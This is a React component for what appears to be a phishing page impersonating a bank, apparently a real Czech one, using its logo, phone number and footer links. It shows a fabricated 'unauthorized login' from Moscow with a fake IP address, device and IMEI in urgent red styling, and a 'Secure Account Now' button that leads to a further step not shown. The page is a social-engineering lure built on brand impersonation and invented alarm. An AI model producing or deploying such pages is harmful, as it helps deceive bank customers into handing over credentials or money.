import { Phone, Globe, AlertTriangle, Shield } from 'lucide-react';
import { Button } from '../ui/button';
import { Separator } from '../ui/separator';
import { useLanguage } from '../LanguageContext';

interface SecurityAlertPageProps {
  onSecureAccount: () => void;
}

export default function SecurityAlertPage({ onSecureAccount }: SecurityAlertPageProps) {
  const { toggleLanguage, t } = useLanguage();

  // Mock suspicious login data
  const suspiciousLogin = {
    ipAddress: '185.234.76.142',
    location: 'Moscow, Russia',
    device: 'Samsung Galaxy S21',
    version: 'Android 13',
    imei: '356938035643809',
    timestamp: 'October 20, 2025 at 14:32 UTC',
  };

  return (
    <div className="min-h-screen bg-[#1a1d23] text-white">
      {/* Header */}
      <header className="border-b border-gray-800 bg-[#1a1d23]">
        <div className="max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
          {/* Logo */}
          <div className="flex items-center">
            <svg width="172" height="24" viewBox="0 0 172 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <clipPath id="a">
                <path d="m0 0h172v24h-172z"/>
              </clipPath>
              <mask id="b" height="24" maskUnits="userSpaceOnUse" width="21" x="0" y="0">
                <path d="m10.1535 10.1373-10.1535-10.1373v24l10.1059-10.0909 1.9143-1.907h-.0026l5.6968-5.68983v11.37823l-3.83-3.8264-1.8681 1.8593 8.2906 8.2766v-24l-10.1521 10.1373zm-7.56225 7.5505v-11.37826l5.69675 5.68836z" fill="#fff"/>
              </mask>
              <g clipPath="url(#a)">
                <g mask="url(#b)">
                  <path d="m-11.6223 11.9979 21.7758-22.4833 21.7744 22.4833-21.7744 22.4847z" fill="#fff"/>
                </g>
                <path d="m41.0172 18.5368h2.574v-13.62103l-7.2211 9.90663-7.2212-9.90663v13.62103h2.5728v-5.9833l4.6484 6.5103 4.6471-6.5103zm15.394-6.547c0 2.3234-1.8033 4.2059-4.0335 4.2059-2.2304 0-4.031-1.8825-4.031-4.2059 0-2.32347 1.8046-4.20731 4.031-4.20731 2.2263 0 4.0335 1.88112 4.0335 4.20731zm2.7076 0c0-3.77867-3.0183-6.8447-6.7411-6.8447-3.723 0-6.7386 3.06467-6.7386 6.8447 0 3.78 3.0196 6.8432 6.7386 6.8432 3.7189 0 6.7411-3.066 6.7411-6.8432zm4.2584-1.544 10.0014 8.618v-13.61974h-2.574v8.09234l-10.0014-8.62063v13.62103h2.574v-8.0896zm12.5477 8.091h9.7567v-2.3971h-7.1086v-2.9814h6.8049v-2.3357h-6.8049v-2.93499h7.1086v-2.44355h-9.7567v13.09134zm22.4979-10.64919 1.3775-2.44355h-12.6613v2.44355h3.818v10.64779h2.6482v-10.64779h4.816zm6.4782 5.99829h-4.161l2.073-3.8169zm2.554 4.6495h2.924l-7.547-13.621-7.544 13.621h2.9178l1.3629-2.5076h6.5153zm17.812-3.956c0 .9119-.711 1.6463-1.886 1.6463h-3.884v-3.294h3.884c1.175 0 1.886.7344 1.886 1.6463m-.361-5.32935c0 .80395-.632 1.47155-1.718 1.47155h-3.691v-2.93634h3.691c1.087 0 1.718.65799 1.718 1.46615m1.106 2.28929c.874-.4778 1.496-1.3993 1.496-2.60873 0-1.99308-1.505-3.48651-3.905-3.48651h-6.752v13.09414h6.99c2.412 0 4.135-1.7733 4.135-3.9629 0-1.5371-.775-2.5828-1.964-3.0347m11.725 2.3453h-4.166l2.08-3.8182zm2.557 4.6509h2.929l-7.557-13.62103-7.547 13.62103h2.923l1.362-2.5063h6.52zm6.809-8.0882 9.996 8.6152v-13.62111h-2.569v8.08831l-10.006-8.61523v13.62103h2.579zm18.858.2566 5.425-5.26251h-3.587l-5.605 5.43721v-5.43721h-2.645v13.09411h2.645v-4.1909l1.856-1.7869 4.426 5.9778h3.282z" fill="#fff"/>
              </g>
            </svg>
          </div>

          {/* Contact Info */}
          <div className="flex items-center gap-8">
            <a href="tel:224443636" className="flex items-center gap-2 hover:text-gray-300 transition-colors">
              <Phone className="w-4 h-4" />
              <span>{t('phone')}</span>
            </a>
            <button onClick={toggleLanguage} className="flex items-center gap-2 hover:text-gray-300 transition-colors">
              <Globe className="w-4 h-4" />
              <span>{t('czechVersion')}</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-5xl mx-auto px-6 py-16">
        {/* Critical Security Alert Banner */}
        <div className="bg-[#8B0000] border-2 border-[#DC143C] rounded-lg p-6 mb-10">
          <div className="flex items-start gap-4">
            <div className="bg-white rounded-full p-2 flex-shrink-0">
              <Shield className="w-6 h-6 text-[#8B0000]" />
            </div>
            <div>
              <h1 className="mb-2">{t('criticalSecurityAlert')}</h1>
              <p className="text-white leading-relaxed">
                {t('securityAlertDescription')}
              </p>
            </div>
          </div>
        </div>

        {/* Suspicious Login Details Card */}
        <div className="bg-[#242830] border border-gray-700 rounded-lg overflow-hidden">
          <div className="bg-[#DC143C] px-8 py-5 flex items-center gap-3">
            <AlertTriangle className="w-6 h-6 text-white" />
            <h2 className="text-white">{t('unauthorizedLogin')}</h2>
          </div>
          
          <div className="p-8 space-y-8">
            <div className="bg-[#1a1d23] rounded-lg p-6 border-l-4 border-[#DC143C]">
              <p className="text-white leading-relaxed">
                {t('securitySystemMessage')}
              </p>
            </div>

            <div>
              <div className="flex items-center gap-2 mb-6">
                <div className="w-1 h-6 bg-[#DC143C]"></div>
                <h3 className="text-white">{t('suspiciousActivityDetails')}</h3>
              </div>
              
              <div className="bg-[#1a1d23] rounded-lg p-8">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-x-12 gap-y-6">
                  <div className="space-y-2">
                    <div className="text-gray-400 uppercase tracking-wide">{t('ipAddress')}</div>
                    <div className="text-white font-mono text-lg">{suspiciousLogin.ipAddress}</div>
                  </div>

                  <div className="space-y-2">
                    <div className="text-gray-400 uppercase tracking-wide">{t('geographicLocation')}</div>
                    <div className="text-white text-lg">{suspiciousLogin.location}</div>
                  </div>

                  <div className="space-y-2">
                    <div className="text-gray-400 uppercase tracking-wide">{t('deviceModel')}</div>
                    <div className="text-white text-lg">{suspiciousLogin.device}</div>
                  </div>

                  <div className="space-y-2">
                    <div className="text-gray-400 uppercase tracking-wide">{t('operatingSystem')}</div>
                    <div className="text-white text-lg">{suspiciousLogin.version}</div>
                  </div>

                  <div className="space-y-2">
                    <div className="text-gray-400 uppercase tracking-wide">{t('deviceIMEI')}</div>
                    <div className="text-white font-mono text-lg">{suspiciousLogin.imei}</div>
                  </div>

                  <div className="space-y-2">
                    <div className="text-gray-400 uppercase tracking-wide">{t('dateTime')}</div>
                    <div className="text-white text-lg">{suspiciousLogin.timestamp}</div>
                  </div>
                </div>
              </div>
            </div>

            <Separator className="bg-gray-700" />

            {/* Action Button */}
            <div className="flex justify-center pt-6">
              <Button 
                onClick={onSecureAccount}
                className="bg-[#d4af37] hover:bg-[#c09d2e] text-black px-12 py-7 rounded-full transition-all shadow-lg hover:shadow-xl"
              >
                <Shield className="w-5 h-5 mr-2" />
                {t('secureAccountNow')}
              </Button>
            </div>

            <div className="text-center text-gray-400">
              <p className="mb-2">{t('recognizeActivity')}</p>
            </div>

            <div className="bg-amber-950/40 border-l-4 border-amber-600 rounded-r-lg p-6">
              <p className="text-amber-100 leading-relaxed">
                <strong className="text-amber-50 block mb-2">{t('importantNotice')}</strong>
                {t('importantNoticeText')}
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-gray-800 mt-20">
        <div className="max-w-7xl mx-auto px-6 py-8">
          <div className="flex flex-wrap items-center justify-center gap-6 text-sm mb-6">
            <a href="#" className="text-[#d4af37] hover:underline">
              {t('safeUseRules')}
            </a>
            <a href="#" className="hover:text-gray-300">
              {t('cookieSettings')}
            </a>
            <a href="#" className="hover:text-gray-300">
              {t('loan')}
            </a>
            <a href="#" className="hover:text-gray-300">
              {t('contacts')}
            </a>
            <a href="#" className="hover:text-gray-300">
              {t('website')}
            </a>
          </div>

          {/* Social Icons */}
          <div className="flex items-center justify-center gap-3 mb-6">
            <a href="#" className="bg-white text-black w-8 h-8 rounded-full flex items-center justify-center hover:bg-gray-200 transition-colors">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
              </svg>
            </a>
            <a href="#" className="bg-[#1877F2] w-8 h-8 rounded-full flex items-center justify-center hover:bg-[#1565D8] transition-colors">
              <svg className="w-4 h-4" fill="white" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
            </a>
          </div>

          <div className="text-center text-gray-500 text-sm">
            {t('copyright')}
          </div>
        </div>
      </footer>
    </div>
  );
}
